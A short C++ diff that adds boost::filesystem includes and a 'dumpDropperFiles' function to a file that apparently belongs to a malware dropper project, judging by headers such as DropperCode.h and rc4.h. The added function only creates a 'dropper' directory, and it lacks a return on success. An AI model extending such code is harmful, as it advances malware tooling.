@@ -1,5 +1,12 @@
 #include <time.h>
 
+#include <iostream>
+#include <string>
+using namespace std;
+
+#include <boost/filesystem.hpp>
+namespace bf = boost::filesystem;
+
 #include "DropperCode.h"
 #include "XRefNames.h"
 #include "rc4.h"
@@ -1109,4 +1116,13 @@ __forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD len
 	}
 
 	return true;
+}
+
+bool dumpDropperFiles()
+{
+	bf::path dir("dropper");
+	if ( !bf::create_directory( dir ) ) {
+		cout << "Cannot create directory " << dir << endl;
+		return false;
+	}
 }
